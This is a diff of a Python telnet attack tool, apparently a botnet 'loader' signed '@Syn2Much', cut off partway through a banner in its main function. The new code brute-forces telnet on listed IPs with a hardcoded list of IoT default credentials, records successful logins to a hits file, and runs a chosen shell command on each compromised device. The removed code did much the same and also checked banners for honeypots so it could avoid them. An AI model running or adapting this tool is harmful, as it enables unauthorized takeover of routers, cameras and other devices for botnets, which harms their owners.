@@ -1,582 +1,630 @@
-import re
+#!/usr/bin/env python3
+import os
+import sys
+import io
 import time
-import telnetlib
+import signal
 import socket
 import argparse
-import sys
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Lock
+import threading
 
-#     .....                           ..          ...                                 ..
-#  .H8888888h.  ~-.             x .d88"       .zf"` `"tu                            dF
-#  888888888888x  `>             5888R       x88      '8N.        u.               '88bu.                    .u    .
-# X~     `?888888hx~      .u     '888R       888k     d88&  ...ue888b        u     '*88888bu        .u     .d88B :@8c
-# '      x8.^"*88*"    ud8888.    888R       8888N.  @888F  888R Y888r    us888u.    ^"*8888N    ud8888.  ="8888f8888r
-#  `-:- X8888x       :888'8888.   888R       `88888 9888%   888R I888> .@88 "8888"  beWE "888L :888'8888.   4888>'88"
-#       488888>      d888 '88%"   888R         %888 "88F    888R I888> 9888  9888   888E  888E d888 '88%"   4888> '
-#     .. `"88*       8888.+"      888R          8"   "*h=~  888R I888> 9888  9888   888E  888E 8888.+"      4888>
-#   x88888nX"      . 8888L        888R        z8Weu        u8888cJ888  9888  9888   888E  888F 8888L       .d888L .+
-#  !"*8888888n..  :  '8888c. .+  .888B .     ""88888i.   Z  "*888*P"   9888  9888  .888N..888  '8888c. .+  ^"8888*"
-# '    "*88888888*    "88888%    ^*888%     "   "8888888*     'Y"      "888*""888"  `"888*""    "88888%       "Y"
-#         ^"***"`       "YP'       "%             ^"**""                ^Y"   ^Y'      ""         "YP'
+# Force UTF-8 so the banner works on latin-1 terminals
+if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
 
-#                                                                           teloader v3 by @Syn2Much
-#                                                                                 enjoy bots
-# ANSI colors
-RST = "\033[0m"
-BOLD = "\033[1m"
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-CYAN = "\033[96m"
-WHITE = "\033[97m"
+from queue import Queue, Empty
+from sys import stdout
 
-# Lock for thread-safe printing
-print_lock = Lock()
-counter_visible = False  # tracks whether the counter bar is currently displayed
+# ---------- Colors ----------
+R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'
+G='\033[1;32m'; Y='\033[1;33m'; Q='\033[1;36m'
+W='\033[0m'
+
+# ANSI helpers for the live status line
+CLEAR_LINE = '\033[2K\r'
+CURSOR_HIDE = '\033[?25l'
+CURSOR_SHOW = '\033[?25h'
+STATUS_PREFIX = '\033[1;30m'  # dim
+
+# ---------- Combo list ----------
+combo = [
+    "root:root", "admin:admin", "admin:ADMIN", "daemon:daemon", "root:vizxv",
+    "root:pass", "root:anko", "root:1234", "root:", "admin:", "root:xc3511",
+    "root:juantech", "default:", "default:default", "supervisor:zyad1234",
+    "root:5up", "default:lJwpbo6", "daemon:", "adm:", "root:696969",
+    "root:1234567", "User:admin", "guest:12345", "guest:password",
+    "root:zlxx.", "root:1001chin", "root:hunt5759", "admin:true", "admin:changeme",
+    "baby:baby", "root:xmhdipc", "root:12341234", "root:ttnet",
+    "root:Serv4EMC", "default:S2fGqNFs", "default:OxhlwSG8", "toor:root",
+    "root:toor", "vstarcam2015:20150602", "root:zsun1188",
+    "admin:meinsm", "admin:adslnadam", "root:ipcam_rt5350", "Menara:Menara",
+    "admin:ho4uku6at", "root:t0talc0ntr0l4!", "admin:gvt12345", "adminisp:adminisp",
+    "root:hi3518", "root:ikwb", "admin:ip3000", "admin:1234", "admin:12345",
+    "telnet:telnet", "admin:1234567", "root:system", "admin:password",
+    "root:888888", "root:88888888", "root:klv1234", "root:Zte521",
+    "root:jvbzd", "root:7ujMko0vizxv", "root:7ujMko0admin", "root:dreambox",
+    "root:user", "root:realtek", "root:00000000", "admin:1111111", "admin:54321",
+    "admin:123456", "default:123456", "default:antslq", "default:tlJwpbo6",
+    "root:default", "default:pass", "default:12345", "default:password",
+    "root:taZz@23495859", "root:20080826", "admin:7ujMko0admin", "root:gforge",
+    "admin:synnet", "guest:1111", "root:admin1234", "root:tl789",
+    "admin:fliradmin", "root:12345678", "root:123456789", "root:1234567890",
+    "root:vertex25ektks123", "root:admin@mymifi", "admin:pass",
+    "admin:admin1234", "admin:smcadmin", "root:1111", "admin:1111",
+    "root:54321", "root:666666", "root:klv123", "Administrator:admin",
+    "service:service", "supervisor:supervisor", "admin1:password",
+    "administrator:1234", "666666:666666", "888888:888888", "tech:tech",
+    "admin:dvr2580222", "ubnt:ubnt", "user:12345", "admin:aquario",
+    "ftp:ftp", "hikvision:hikvision", "guest:guest", "user:user",
+    "root:abc123", "root:admin", "root:123456", "sysadm:sysadm",
+    "support:support", "root:password", "bin:", "root:cat1029",
+    "admin:cat1029", "mother:fucker", "root:antslq",
+]
+
+# ---------- Globals ----------
+output_file = "hits.txt"
+input_file_path = None
+debug = False
+timeout = 5
+command = None
+queue = Queue()
+ok_count = 0
+fail_count = 0
+lock = threading.Lock()
+
+# Live stats
+start_time = time.time()
+total_targets = 0
+processed_count = 0
+stats_lock = threading.Lock()
+status_thread = None
+
+# Track completed lines (raw text from input file) so we can strip them
+completed_lines = []
+completed_lock = threading.Lock()
+
+# Graceful shutdown
+shutdown = threading.Event()
+
+# Track active Router threads
+active_workers = []
+active_lock = threading.Lock()
 
 
-def build_counter(total, logins, commands, remaining):
-    """Build the colored counter bar string."""
-    return (
-        f"  {BOLD}{WHITE}[Total: {total}]{RST}  "
-        f"{BOLD}{GREEN}[Logins: {logins}]{RST}  "
-        f"{BOLD}{YELLOW}[Commands: {commands}]{RST}  "
-        f"{BOLD}{CYAN}[Remaining: {remaining}]{RST}"
+# ---------- Help menu ----------
+def print_help():
+    print(f"""
+{C}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+â•‘{G}                     T E L N E T   T A N K                          {C}â•‘
+â•‘{Y}              @Syn2Much  |  Code Fixed  |  v1.0                      {C}â•‘
+â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{W}
+
+{C}â”Œâ”€{G} USAGE {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
+   {Y}python3 main.py {C}[{G}OPTIONS{C}]{W}
+
+{C}â”Œâ”€{G} INPUT MODES {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
+   {G}Log mode:{C}    each line = {Y}ip:port user:pass{C}
+                â†’ tries that {B}exact credential{C} only
+   {G}Brute mode:{C}  each line = {Y}ip{C} or {Y}ip:port{C}
+                â†’ brute-forces the built-in combo list
+
+{C}â”Œâ”€{G} OPTIONS {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
+   {G}-h, --help{C}              {C}Show this help menu{W}
+   {G}-f, --file {Y}<file>{C}       {C}Targets file (log or IP list){W}
+   {G}-x, --target {Y}<tgt>{C}      {C}Single target: {Y}ip{C}, {Y}ip:port{C}, or {Y}"ip:port user:pass"{W}
+   {G}-t, --threads {Y}<n>{C}       {C}Number of worker threads {Y}(default: 50){W}
+   {G}-c, --command {Y}<cmd>{C}     {C}Shell command to run after successful login{W}
+   {G}-g, --timeout {Y}<sec>{C}     {C}Socket timeout in seconds {Y}(default: 5){W}
+   {G}-o, --output {Y}<file>{C}     {C}Hits file â€” {G}appended{C}, never overwritten {Y}(default: hits.txt){W}
+   {G}-d, --debug{C}              {C}Verbose per-attempt output{W}
+   {G}-k, --keep{C}               {C}Do {Y}not{C} strip processed lines from input file on exit{W}
+
+{C}â”Œâ”€{G} EXAMPLES {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
+   {C}# Brute a list of IPs{C}
+   {Y}python3 main.py -f ips.txt -t 100 -g 5{W}
+
+   {C}# Replay a credential log{C}
+   {Y}python3 main.py -f creds.txt -t 50{W}
+
+   {C}# Single target, brute{C}
+   {Y}python3 main.py -x 1.2.3.4{W}
+
+   {C}# Single target with creds{C}
+   {Y}python3 main.py -x "1.2.3.4:23 root:root"{W}
+
+   {C}# Login then drop a command{C}
+   {Y}python3 main.py -f creds.txt -c "id; uname -a"{W}
+
+   {C}# Keep input file untouched{C}
+   {Y}python3 main.py -f ips.txt -k{W}
+
+{C}â”Œâ”€{G} NOTES {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
+   {G}â€¢{C} Press {Y}Ctrl+C{C} any time â€” the program saves, strips processed
+     lines from the input file, and exits gracefully
+   {G}â€¢{C} Hits are {G}appended{C} to the output file (never overwritten)
+   {G}â€¢{C} Each hit is flushed to disk immediately after discovery
+   {G}â€¢{C} Live progress bar is updated every second at the bottom
+
+{C}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜{W}
+""")
+
+
+# ---------- Signal handling ----------
+def handle_signal(signum, frame):
+    if not shutdown.is_set():
+        # Move the cursor down one line so the status bar doesn't overwrite our message
+        print(f"\n{Y}[!] Signal {signum} received â€” finishing current task and saving...{C}")
+        shutdown.set()
+
+
+signal.signal(signal.SIGINT,  handle_signal)
+signal.signal(signal.SIGTERM, handle_signal)
+
+
+# ---------- Live status bar ----------
+def human_time(seconds):
+    seconds = int(seconds)
+    h, rem = divmod(seconds, 3600)
+    m, s = divmod(rem, 60)
+    if h:
+        return f"{h}h{m:02d}m{s:02d}s"
+    if m:
+        return f"{m}m{s:02d}s"
+    return f"{s}s"
+
+
+def print_status():
+    """Repaint the live status line at the bottom."""
+    global processed_count
+
+    with stats_lock:
+        remaining = total_targets - processed_count
+        elapsed = time.time() - start_time
+        speed = processed_count / elapsed if elapsed > 0 else 0
+        ok = ok_count
+        fail = fail_count
+        active = len(active_workers)
+
+    bar_width = 30
+    pct = (processed_count / total_targets) if total_targets else 0
+    filled = int(bar_width * pct)
+    bar = f"{G}{'â–ˆ' * filled}{STATUS_PREFIX}{'â–‘' * (bar_width - filled)}{W}"
+
+    line = (
+        f"{STATUS_PREFIX}[{W}"
+        f"{Y}{processed_count}{W}/{C}{total_targets}{W} "
+        f"{bar} "
+        f"{G}âœ“{ok}{W} "
+        f"{R}âœ—{fail}{W} "
+        f"{B}act{active}{W} "
+        f"{Q}{speed:4.1f}/s{W} "
+        f"{STATUS_PREFIX}{human_time(elapsed)}{W}"
+        f"{STATUS_PREFIX}]{W}"
     )
-
-
-def display_result(text, total, logins, commands, remaining):
-    """Clear the counter line, print a result, then reprint the counter."""
-    global counter_visible
-    with print_lock:
-        # If a counter bar is on screen, erase it first
-        if counter_visible:
-            sys.stdout.write("\r\033[2K")
-        # Print the result line(s)
-        print(text)
-        # Reprint the counter bar (no trailing newline so it stays in place)
-        sys.stdout.write(build_counter(total, logins, commands, remaining))
-        sys.stdout.flush()
-        counter_visible = True
-
-
-def update_counter(total, logins, commands, remaining):
-    """Redraw only the counter bar in-place (no result to print)."""
-    global counter_visible
-    with print_lock:
-        sys.stdout.write("\r\033[2K")
-        sys.stdout.write(build_counter(total, logins, commands, remaining))
-        sys.stdout.flush()
-        counter_visible = True
-
-
-def clear_counter():
-    """Clear the counter bar so normal output can resume."""
-    global counter_visible
-    with print_lock:
-        if counter_visible:
-            sys.stdout.write("\r\033[2K")
-            sys.stdout.flush()
-            counter_visible = False
-
-
-def parse_target(target_line):
-    """Parse a target line into host, port, username, password."""
-    target_line = target_line.strip()
-    if not target_line:
-        return None
-
-    parts = target_line.split()
-    if len(parts) != 2:
-        return None
-
-    host_port, user_pass = parts
-
-    # Parse host:port
-    if ":" in host_port:
-        host, port = host_port.rsplit(":", 1)
-        port = int(port)
-    else:
-        host = host_port
-        port = 23  # Default telnet port
-
-    # Parse user:password
-    if ":" in user_pass:
-        user, password = user_pass.split(":", 1)
-    else:
-        user = user_pass
-        password = ""
-
-    return {"host": host, "port": port, "user": user, "password": password}
-
-
-# Shell prompt patterns: (compiled regex, label, privilege level)
-SHELL_PROMPTS = [
-    (re.compile(b"\\$ $"), "sh", "user"),
-    (re.compile(b"\\$\\ $"), "sh", "user"),
-    (re.compile(b"# $"), "root", "root"),
-    (re.compile(b"#\\ $"), "root", "root"),
-    (re.compile(b"> $"), "cli", "user"),
-    (re.compile(b">\\ $"), "cli", "user"),
-    (re.compile(b"% $"), "csh", "user"),
-    (re.compile(b"%\\ $"), "csh", "user"),
-    (re.compile(b"\\(.*\\)#"), "busybox", "root"),
-    (re.compile(b"\\(.*\\)\\$"), "busybox", "user"),
-]
-
-# Pre-compiled patterns for telnetlib.expect (order matters)
-_PROMPT_EXPECT = [pat for pat, _, _ in SHELL_PROMPTS]
-
-# Pre-compiled login prompt patterns
-_LOGIN_PROMPTS = [
-    re.compile(b"login: "),
-    re.compile(b"Login: "),
-    re.compile(b"Username: "),
-    re.compile(b"username: "),
-]
-
-# Pre-compiled password prompt patterns
-_PASSWORD_PROMPTS = [
-    re.compile(b"Password: "),
-    re.compile(b"password: "),
-]
-
-# Pre-compiled login failure signatures
-LOGIN_FAIL_PATTERNS = [
-    re.compile(b"Login incorrect"),
-    re.compile(b"login incorrect"),
-    re.compile(b"Authentication failed"),
-    re.compile(b"authentication failed"),
-    re.compile(b"Access denied"),
-    re.compile(b"access denied"),
-    re.compile(b"Login failed"),
-    re.compile(b"login failed"),
-    re.compile(b"invalid login"),
-    re.compile(b"Invalid login"),
-    re.compile(b"bad password"),
-    re.compile(b"Bad password"),
-    re.compile(b"Permission denied"),
-    re.compile(b"incorrect password"),
-]
-
-# Honeypot detection: specific software names that appear in banners/MOTD.
-# Only match strings that definitively identify honeypot software.
-# Word-boundary anchored to prevent substring false matches.
-# Removed generic words ("honeypot", "glutton") that cause false positives
-# on real devices with security warnings or English-language MOTDs.
-_HONEYPOT_SIGNATURES = [
-    re.compile(rb"\bkippo\b", re.IGNORECASE),
-    re.compile(rb"\bcowrie\b", re.IGNORECASE),
-    re.compile(rb"\bdionaea\b", re.IGNORECASE),
-    re.compile(rb"\bhonssh\b", re.IGNORECASE),
-    re.compile(rb"\btelnet.honey\b", re.IGNORECASE),
-    re.compile(rb"\bhoneytrap\b", re.IGNORECASE),
-    re.compile(rb"\bheralding\b", re.IGNORECASE),
-    re.compile(rb"\bconpot\b", re.IGNORECASE),
-    re.compile(rb"\btpotce\b", re.IGNORECASE),
-]
-
-
-def detect_honeypot(banner_data):
-    """Check for known honeypot software names in banner/session data.
-
-    Only flags definitive, word-boundary-anchored signatures of known
-    honeypot frameworks.  Does NOT flag generic words like "honeypot"
-    or timing anomalies to avoid false positives on real devices.
-
-    Returns a string describing the honeypot indicator, or None.
-    """
-    for pat in _HONEYPOT_SIGNATURES:
-        m = pat.search(banner_data)
-        if m:
-            return f"honeypot signature: {m.group().decode('ascii', errors='replace')}"
-    return None
-
-
-def detect_shell(data):
-    """Inspect raw bytes for known shell prompt signatures.
-
-    Returns (shell_label, privilege) or (None, None).
-    """
-    for pattern, label, priv in SHELL_PROMPTS:
-        if pattern.search(data):
-            return label, priv
-    return None, None
-
-
-def _remaining(deadline):
-    """Seconds left until *deadline*, floored at 0."""
-    return max(0.0, deadline - time.monotonic())
-
-
-def telnet_connect(target, command="uname -a", timeout=10, max_time=None):
-    """Connect to a single target and execute commands."""
-    host = target["host"]
-    port = target["port"]
-    user = target["user"]
-    password = target["password"]
-
-    if max_time is None:
-        max_time = 4 * timeout
-    deadline = time.monotonic() + max_time
-
-    result = {
-        "host": host,
-        "port": port,
-        "user": user,
-        "success": False,
-        "output": "",
-        "error": "",
-        "shell": "",
-        "privilege": "",
-        "honeypot": "",
-    }
-
+    # Truncate to terminal width so we don't wrap
     try:
-        # Connect to the Telnet server
-        tn = telnetlib.Telnet(host, port, timeout=timeout)
+        width = os.get_terminal_size().columns - 1
+    except OSError:
+        width = 120
+    stdout.write(CLEAR_LINE + line[:width])
+    stdout.flush()
 
-        # Collect all banner data for honeypot analysis
-        banner_data = b""
 
-        # Login process - handle different prompt styles
-        wait = min(timeout, _remaining(deadline))
-        index, match, text = tn.expect(_LOGIN_PROMPTS, timeout=wait)
-        banner_data += text
-        if index == -1:
-            result["error"] = "No login prompt received"
-            tn.close()
-            return result
-        tn.write(user.encode("ascii") + b"\n")
-
-        wait = min(timeout, _remaining(deadline))
-        index, match, text = tn.expect(_PASSWORD_PROMPTS, timeout=wait)
-        banner_data += text
-        if index == -1:
-            result["error"] = "No password prompt received"
-            tn.close()
-            return result
-        tn.write(password.encode("ascii") + b"\n")
-
-        # Wait for either a shell prompt or a login-failure message
-        post_login_expect = _PROMPT_EXPECT + LOGIN_FAIL_PATTERNS
-        wait = min(timeout, _remaining(deadline))
-        index, match, text = tn.expect(post_login_expect, timeout=wait)
-        banner_data += text
-
-        if index == -1:
-            # Timeout — no recognisable prompt or failure string
-            result["error"] = "No shell prompt detected (unknown device)"
-            tn.close()
-            return result
-
-        if index >= len(_PROMPT_EXPECT):
-            # Matched a login-failure pattern
-            fail_msg = text.decode("ascii", errors="replace").strip()
-            result["error"] = f"Login rejected: {fail_msg}"
-            tn.close()
-            return result
-
-        # Matched a shell prompt — identify it
-        shell_label, privilege = SHELL_PROMPTS[index][1], SHELL_PROMPTS[index][2]
-
-        # Secondary heuristic: scan the full received text for busybox / device hints
-        post_text = text.decode("ascii", errors="replace").lower()
-        if "busybox" in post_text:
-            shell_label = "busybox"
-        elif "mikrotik" in post_text:
-            shell_label = "mikrotik"
-        elif "/tc/" in post_text or "procd" in post_text:
-            shell_label = "openwrt"
-
-        result["shell"] = shell_label
-        result["privilege"] = privilege
-
-        # Honeypot detection — bail out before sending any command
-        hp = detect_honeypot(banner_data)
-        if hp:
-            result["honeypot"] = hp
-            result["error"] = f"Honeypot detected ({hp}), command not sent"
-            tn.close()
-            return result
-
-        # Execute command
-        tn.write(command.encode("ascii") + b"\n")
-        tn.write(b"exit\n")
-
-        # Read output with deadline instead of blocking read_all()
-        output_chunks = []
-        read_deadline = min(deadline, time.monotonic() + timeout)
+def status_loop():
+    while not shutdown.is_set():
         try:
-            while True:
-                wait = max(0.0, min(2.0, read_deadline - time.monotonic()))
-                if wait <= 0:
-                    break
-                idx, _, chunk = tn.expect(_PROMPT_EXPECT, timeout=wait)
-                if chunk:
-                    output_chunks.append(chunk)
-                if idx != -1:
-                    break
-                if not chunk:
-                    break
-        except EOFError:
-            pass  # Connection closed after exit — normal
-
-        # Drain any residual data
-        try:
-            leftover = tn.read_very_eager()
-            if leftover:
-                output_chunks.append(leftover)
-        except EOFError:
+            print_status()
+        except Exception:
             pass
-
-        output = b"".join(output_chunks).decode("ascii", errors="replace")
-        result["output"] = output.strip()
-        result["success"] = True
-
-        tn.close()
-
-    except socket.timeout:
-        result["error"] = "Connection timed out"
-    except ConnectionRefusedError:
-        result["error"] = "Connection refused"
-    except ConnectionResetError:
-        result["error"] = "Connection reset"
-    except EOFError:
-        result["error"] = "Connection closed by remote host"
-    except Exception as e:
-        result["error"] = str(e)
-
-    return result
-
-
-def _is_transient(result):
-    """Return True if the failure looks transient (worth retrying)."""
-    err = result.get("error", "")
-    transient_keywords = [
-        "timed out",
-        "Connection refused",
-        "Connection reset",
-        "Connection closed",
-    ]
-    return any(kw in err for kw in transient_keywords)
-
-
-def telnet_connect_with_retry(
-    target, command="uname -a", timeout=10, max_time=None, retries=0
-):
-    """Wrap telnet_connect() with retry logic for transient failures."""
-    for attempt in range(1 + retries):
-        result = telnet_connect(
-            target, command=command, timeout=timeout, max_time=max_time
-        )
-        if result["success"] or not _is_transient(result) or attempt >= retries:
-            return result
-        # Brief backoff: 0.5s increments, capped at 2s
-        time.sleep(min(0.5 * (attempt + 1), 2.0))
-    return result
-
-
-def load_targets(filename):
-    """Load targets from a file."""
-    targets = []
+        time.sleep(1)
+    # One final paint
     try:
-        with open(filename, "r") as f:
-            for line in f:
-                parsed = parse_target(line)
-                if parsed:
-                    targets.append(parsed)
-    except FileNotFoundError:
-        print(f"Error: File '{filename}' not found.")
-        exit(1)
-    except Exception as e:
-        print(f"Error reading file: {e}")
-        exit(1)
+        print_status()
+    except Exception:
+        pass
 
-    return targets
+
+# ---------- Helpers ----------
+def readUntil(tn, string, timeout=8):
+    buf = b''
+    start_time_ = time.time()
+    while time.time() - start_time_ < timeout:
+        if shutdown.is_set():
+            raise Exception('SHUTDOWN')
+        try:
+            chunk = tn.recv(1024)
+            if not chunk:
+                break
+            buf += chunk
+            if string.encode() in buf:
+                return buf.decode(errors='ignore')
+        except socket.timeout:
+            break
+        except Exception:
+            break
+    if string.encode() in buf:
+        return buf.decode(errors='ignore')
+    raise Exception('TIMEOUT!')
+
+
+def save_hit(ip, port, username, password):
+    """Append a hit to the output file and flush immediately."""
+    line = f"{ip}:{port} {username}:{password}\n"
+    with lock:
+        try:
+            with open(output_file, "a") as f:
+                f.write(line)
+                f.flush()
+                os.fsync(f.fileno())
+        except Exception as e:
+            print(f"{R}[!] Could not save hit: {e}{C}")
+
+
+def try_login(ip, port, username, password):
+    """Attempt a single login. Returns True on success."""
+    if shutdown.is_set():
+        return False
+
+    tn = None
+    try:
+        tn = socket.socket()
+        tn.settimeout(1.5 if shutdown.is_set() else timeout)
+        tn.connect((ip, port))
+    except Exception:
+        if tn:
+            try: tn.close()
+            except: pass
+        return False
+
+    if debug:
+        # Clear the status line before printing debug so it doesn't mix
+        stdout.write(CLEAR_LINE)
+        print(f"[DEBUG] {ip}:{port} -> {username}:{password}")
+
+    try:
+        hoho = readUntil(tn, "ogin", timeout=timeout)
+        if "ogin" in hoho:
+            tn.send((username + "\n").encode())
+            time.sleep(0.09)
+        else:
+            tn.close()
+            return False
+    except Exception:
+        try: tn.close()
+        except: pass
+        return False
+
+    try:
+        hoho = readUntil(tn, "assword", timeout=timeout)
+        if "assword" in hoho:
+            tn.send((password + "\n").encode())
+            time.sleep(0.8)
+        else:
+            tn.close()
+            return False
+    except Exception:
+        try: tn.close()
+        except: pass
+        return False
+
+    try:
+        prompt = tn.recv(40960).decode(errors='ignore')
+    except Exception:
+        try: tn.close()
+        except: pass
+        return False
+
+    success = False
+    if ">" in prompt and "ONT" not in prompt:
+        success = True
+    elif any(c in prompt for c in ["#", "$", "%", "@"]):
+        success = True
+
+    bad_words = ["failed", "incorrect", "invalid", "ogin:", "locked",
+                 "rong", "ailure", "erro", "denied"]
+    if any(w in prompt.lower() for w in bad_words):
+        success = False
+
+    if success:
+        save_hit(ip, port, username, password)
+        stdout.write(CLEAR_LINE)
+        print(f'{C}[{G}OK{C}] {Y}{ip}{C}:{Y}{port}{C}  {B}{username}{C}:{B}{password}{C}')
+
+        if command and not shutdown.is_set():
+            try:
+                tn.send((command + "\n").encode())
+                time.sleep(0.5)
+                out = tn.recv(40960).decode(errors='ignore')
+                stdout.write(CLEAR_LINE)
+                print(f'{C}[{G}CMD{C}] {ip} -> {Q}{command}{C}')
+                if out.strip():
+                    print(out)
+            except Exception as e:
+                stdout.write(CLEAR_LINE)
+                print(f'{C}[{R}CMD-ERR{C}] {ip}: {e}')
+
+    try: tn.close()
+    except: pass
+    return success
+
+
+# ---------- Router / target worker ----------
+class Router(threading.Thread):
+    def __init__(self, ip, port, creds=None, raw_line=None):
+        threading.Thread.__init__(self)
+        self.ip = ip
+        self.port = port
+        self.creds = creds
+        self.raw_line = raw_line
+
+    def run(self):
+        global ok_count, fail_count, processed_count
+
+        try:
+            if not shutdown.is_set():
+                if self.creds:
+                    u, p = self.creds
+                    ok = try_login(self.ip, self.port, u, p)
+                    with lock:
+                        if ok: ok_count += 1
+                        else:  fail_count += 1
+                else:
+                    hit = False
+                    for passwd in combo:
+                        if shutdown.is_set():
+                            return
+                        if ":" in passwd:
+                            u, p = passwd.split(":", 1)
+                        else:
+                            u, p = passwd, ""
+                        if try_login(self.ip, self.port, u, p):
+                            with lock:
+                                ok_count += 1
+                            hit = True
+                            break
+                    if not hit:
+                        with lock:
+                            fail_count += 1
+        finally:
+            with stats_lock:
+                processed_count += 1
+            if self.raw_line is not None:
+                with completed_lock:
+                    completed_lines.append(self.raw_line)
+
+
+# ---------- Worker pool ----------
+def worker():
+    while not shutdown.is_set():
+        try:
+            item = queue.get_nowait()
+        except Empty:
+            return
+
+        try:
+            if isinstance(item, tuple) and len(item) == 4:
+                ip, port, creds, raw = item
+                t = Router(ip, port, creds, raw)
+            else:
+                ip, port, raw = item
+                t = Router(ip, port, None, raw)
+
+            with active_lock:
+                active_workers.append(t)
+            t.start()
+            t.join()
+            with active_lock:
+                if t in active_workers:
+                    active_workers.remove(t)
+        except Exception:
+            pass
+        finally:
+            try: queue.task_done()
+            except: pass
+
+
+# ---------- Arg parsing ----------
+def parse_line(line):
+    stripped = line.strip()
+    if not stripped:
+        return None
+
+    parts = stripped.split()
+    creds = None
+    hostport = parts[0]
+
+    if len(parts) >= 2 and ":" in parts[1]:
+        creds = tuple(parts[1].split(":", 1))
+
+    if ":" in hostport:
+        ip, port_str = hostport.rsplit(":", 1)
+        try:
+            port = int(port_str)
+        except ValueError:
+            ip, port = hostport, 23
+    else:
+        ip, port = hostport, 23
+
+    return ip, port, creds
+
+
+def strip_completed(input_path, keep=False):
+    """Rewrite the input file without the completed raw lines."""
+    if keep:
+        print(f"{C}[{Y}i{C}] --keep set, input file left untouched.{W}")
+        return
+    if not input_path:
+        return
+    with completed_lock:
+        done = set(completed_lines)
+    if not done:
+        return
+
+    try:
+        with open(input_path, "r") as f:
+            remaining = [ln for ln in f if ln.rstrip("\n") not in done
+                         and ln.strip() and ln.rstrip("\n") not in {d.rstrip("\n") for d in done}]
+        # Preserve exactly the lines whose stripped form wasn't marked done
+        with open(input_path, "r") as f:
+            original = f.readlines()
+        with completed_lock:
+            done_raw = set(completed_lines)
+            done_stripped = {d.strip() for d in done_raw}
+        remaining = [ln for ln in original
+                     if ln.strip() and ln.strip() not in done_stripped]
+
+        with open(input_path, "w") as f:
+            f.writelines(remaining)
+        removed = len(original) - len(remaining)
+        print(f"{C}[{Y}i{C}] Stripped {G}{removed}{C} completed line(s) from "
+              f"{Y}{input_path}{C}. {G}{len(remaining)}{C} remaining.{W}")
+    except Exception as e:
+        print(f"{R}[!] Could not update input file: {e}{W}")
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Multi-threaded Telnet connection tool",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Example usage:
-  python telnet_scan.py -l targets.txt -t 10
-  python telnet_scan.py -l targets.txt -t 20 -c "whoami"
-  python telnet_scan.py -l targets.txt -t 5 -o results.txt
+    global debug, timeout, command, output_file, input_file_path
+    global total_targets, status_thread
 
-Target file format (one per line):
-  IP:PORT USER:PASSWORD
-  18.181.177.7:23 root:root
-  221.1.120.79:23 admin:admin
-        """,
-    )
+    print(r"""
+ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ          â–ˆâ–ˆâ–ˆâ–ˆ                         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                   
+â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–ˆ         â–‘â–‘â–ˆâ–ˆâ–ˆ                        â–‘â–‘â–ˆâ–ˆâ–ˆ                    
